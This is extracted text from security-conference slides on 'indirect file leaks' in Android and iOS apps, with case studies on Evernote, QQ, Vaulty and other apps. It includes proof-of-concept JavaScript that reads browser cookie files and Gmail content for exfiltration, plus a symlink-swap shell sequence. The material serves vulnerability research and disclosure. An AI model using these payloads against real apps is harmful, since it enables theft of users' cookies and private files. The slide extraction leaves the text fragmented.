Cross-Platform Analysis of 
Indirect File Leaks 
in Android and iOS Applications
Daoyuan Wu
PhD Candidate at SMU
HITCON 
Pacific’17
Appified World
2
Pic source: https://www.hughesandco.com/native-mobile-apps-vs-web-apps/
Mobile Sandbox
Pic source: http://hiqes.com/android-security-part-1/
×
Different threat model from the PC side
3
Direct File Leak
Case: https://tinyurl.com/CVE-2011-1717   Reference: The SEAndroid paper in NDSS’13.
Once worked; but no longer with SEAndroid
-rw-rw-rw-
main.db
-rw-rw-rw-
shared.xml
CVE-2011-1717
for SKype
×
4
$ getenforce
Enforcing
How to steal private app files 
within the protection of SEAndroid?
Remote 
Adversary
IFL: Indirect File Leak
Deputy
Component
Local 
Adversary
SEAndroid
cannot check it
Allowed by 
SEAndroid
6
Exploitable Deputy Components
Deputy Components for IFLs
Content 
Provider
Browsing 
Interface
Command 
Interpreter
Embedded 
App Server
7
What is Android Content Provider?
• System providers:
– “content://sms/”
– “content://call_log/”
– “content://browser/
bookmarks”
• Apps’ own providers:
– “content://qq.profile/
info”
– “content://qq.friend
list/friendlist
Android App
Read/Write 
Interface
8
Data
Content Provider
IFL via Content Provider
9
1
2
10
http://www4.comp.polyu.edu.hk/~appsec/ 
Many Popular Apps were identified by us to be vulnerable 
(over 60 CVEs)
11
Spent a lot 
of efforts 
writing 
reports
(now first  
released in 
HITCON’17)
https://github.com/daoyuan14/ContentProviderReports
• It all started with reading API document:
• I tested the first PoC on Mi Talk (米聊)
– In the end of Oct 2011 (tested on v2.1.280);
– We should make a good paper () as the 1st reporter.
Story Behind
12
By default exported before Android 4.2
targetSdkVersion  4.1.
• iOS:
– Prior to iOS 9, SOPf2 was broken.
• We reported it to Apple on Jan 2015 (CVE-2015-5921).
• Root cause:
– The legacy SOP cannot adequately cover the local schemes.
– According to the typical web SOP principle, 
• Legal for a file A (at file:///dir1/a.html) to access another file B (at 
file:///dir2/b.txt).
• Because the two origins share the same scheme, domain (i.e., 
127.0.0.1 or localhost), and port.
18
Prior to iOS 9 (even the latest iOS), SOPf2 is still broken.
The FileCross attacks
19
Auto-downloaded to the SD card.
Victim 
Browser
Sensitive
files
Private 
File Zone
Exposed 
Browsing 
Interface
file:///data/data/pkg/dir/Cookies
file:///path/attack2.html
file:///path/attack4.html
file:///path/attack3.html
Attack 
App
attack4.html
attack2
var aim = '/data/data/pkg/dir/Cookies';
function sendFile(txt) { … }
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == 4){
sendFile(xhr.responseText);
}
};
xhr.open('GET', aim);
xhr.send(null);
attack4
var aim = document.URL;
function sendFile(txt) { … }
setTimeout(function() {
var xhr = new XMLHttpRequest();
xhr.onload = function()
{    sendFile(xhr. responseText);    };
xhr.open('GET', aim);    xhr.send(null);
}, 8000);            
The External file:// Browsing Requests
attack3
var aim = 'https://mail.google.com';
function sendFile(txt) { … }
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == 4){
sendFile(xhr.responseText);
}
};
xhr.open('GET', aim);
xhr.send(null);
(A4)
(A2)
(A3)
(A1)
attack3.html
attack2.html
Thread.sleep(4000);
rm /path/attack4.html
ln –s /.../Cookies /path/attack4.html 
Cmd 4
Cmd 1
Execute Cmd 4
Execute Cmd 1
Thread.sleep(3000);
filepath = findFileInSDcard("Cookies");
if (filepath)
readFileFromSDcard(filepath);
attack2
.html
Cookies
Compromise SOP
on the “host” level
attack3
.html
http(s)://
content
Compromise SOP
on the “protocol” level
attack4
.html
docume
nt.URL
Cookies
Compromise SOP
via symbolic links
Detailed sopIFL PoC on Android
20
A2
A4
1
2
2
3
1
2
3
4
• 64 (out of 115) Android browser apps were 
identified by our system to be vulnerable.
• The system and raw results are available at
https://sites.google.com/site/androidfilecross
21
How about sopIFL on iOS?
iOS apps vulnerable to sopIFL
I will first explain three cases, and then show 
how to write PoC exploits.
23
sopIFL case study: Evernote (iOS)
2. Victim opens the 
file in Evernote via 
iOS’s “open with” 
feature
1. Attacker sends a 
crafted HTML file to 
victim via WeChat 
3. Evernote’s cookie file 
is stolen
24
sopIFL Case Study: Mail.Ru (iOS)
1. Attacker sends an 
email with a crafted 
attachment (HTML).
3. Mail.Ru’s
database file 
is stolen.
2. Victim 
opens it
25
sopIFL case study: QQ (iOS)
1. Attacker sends an a 
crafted HTML file in 
the QQ’s chat box.
2. Victim 
opens it
3. QQ’s private 
database file is 
stolen.
26
sopIFL PoC for Evernote iOS
How to obtain this 
relative file path 
for iOS apps? 
27
Tools for accessing iOS app files
• libimobiledevice:
– http://www.libimobiledevice.org/
– Cross-platform: able to run on Linux
• Some GUI tools (based on the library/iTunes):
iTools
iExplorer
iFunBox
28
Works on non-jailbreak iOS devices
29
Obtaining the Relative File Path
(Does not support iOS 8.3 and later)
30
Obtaining the Full File Path 
• Challenges:
– The app directory is a random name on iOS.
• Unlike Android cases, always a fixed package name:
“/data/data/packagename/…”
• https://play.google.com/store/apps/details?id=org.mozilla.firefox
“/data/data/org.mozilla.firefox/…” 
– Directly probing the app directory name requires 
the root privilege on iOS:
31
Obtaining the full file path 
on a non-jailbroken iOS device 
• Works only for apps with browsing interfaces.
• Basic idea:
– Import a local HTML file into the target app.
– This HTML file has the probing JavaScript code:
alert(document.location);
• How to import a HTML file?
– Use the “Import” function in the previous iTools;
– Use the “Open-with” feature on iOS.
32
The probing result using the imported 
HTML file
33
Each new installation generates a different app dir.
Also obtain 
the path of 
exploit file. 
Next, on aimIFL
aimIFL: IFL via executing unauthorized 
JavaScript directly on target files
35
aimIFL-1
aimIFL-2
1
1
2
2
The attack URL 
actively loads 
the target file.
The victim app 
loads the 
target file 
(as a feature).
3
3
3
Apps vulnerable to aimIFL
36
How to load the target file 
through these schemes?
A Simple Case of aimIFL-1 via file://
37
1 User clicks a HTTP link
JS (OK) is injected 
into the target file webviewCookies
Chromium.db via the HTTP cookie.
2 User clicks a file link
An Evolved Case of aimIFL-1 via file://
38
1
JS (OK) is injected into the 
history table of dbbrowser.db via the title.
2 Ask user to long 
press the link
3
Open
WebView by default does not 
provide this functionality.
aimIFL-1 via content:// for 360 Safeguard
39
content://com.qihoo360.mobil
esafeguard/data/data/com.qih
oo360.mobilesafe/databases/
mobilesafeguard.db
1
JS is injected 
via the cookie
2
2
file:// does not 
work
aimIFL-2 on Android: Zirco Browser 
40
JS is injected via 
the URL title
aimIFL-2 on iOS: myVault
41
Briefly introducing 
cmdIFL and serverIFL
http://tinyurl.com/fixissue374
https://github.com/jackpal/Android-Terminal-Emulator/pull/375
IFL via Command Interpreter
• cmdIFL: exploit command interpreters as 
deputies inside victim apps to execute 
unauthorized commands for file leaks.
43
IFL via Embedded App Server
• serverIFL: send unauthorized file extraction 
requests to embedded app server deputies 
inside victim apps to obtain private files.
• Top 10 server-like apps on Android and iOS:
44
serverIFL Case Study: Vaulty
• 5M – 10M installs on Google Play
• For people with the need of private pics/videos.
45
serverIFL Case Study: Vaulty
46
com.squidtooth.vault.data.Provider class
Create an embedded HTTP server
(surprisingly, inside the Provider)
Listening on the 
fixed port no.: 1562
serverIFL Case Study: Vaulty
47
A remote adversary can 
easily steal users’ private 
files by iterating through 
the ID numbers.
Android vs iOS
in terms of the impact of IFL attacks
• Implication 1: The common practice in iOS 
apps to open (untrusted) files in their own app 
domain could lead to more pervasive and 
powerful sopIFL attacks on iOS than Android. 
• Implication 2: The randomized app data 
directory on iOS makes it difficult to conduct 
the aimIFL-1 attacks on iOS.
48
Android vs iOS
in terms of the impact of IFL attacks
• Implication 3: Apple’s strict app review 
prevents iOS apps from executing bash 
commands. An adversary therefore cannot 
find targets to launch the cmdIFL attacks on 
iOS.
• Implication 4: iOS generally does not allow 
background server behavior, which reduces 
the chance of the serverIFL attacks on iOS.
49
Rule 2.8: Apps that install or launch other 
executable code will be rejected.
The IFL model
50
Daoyuan Wu
Twitter: dao0x | Gmail: daoyuan0x
https://daoyuan14.github.io
IFL vulnerabilities
on Android & iOS
Takeaway
References
1. D. Wu and R. Chang. Indirect file leaks in 
mobile applications. In Proc. IEEE Mobile 
Security Technologies (MoST), 2015.
– The slides are mainly based on this paper.
2. D. Wu and R. Chang. Analyzing Android 
Browser Apps for file:// Vulnerabilities. In 
Proc. Springer Information Security 
Conference (ISC), 2014.
– The sopIFL on Android is based on this paper.
51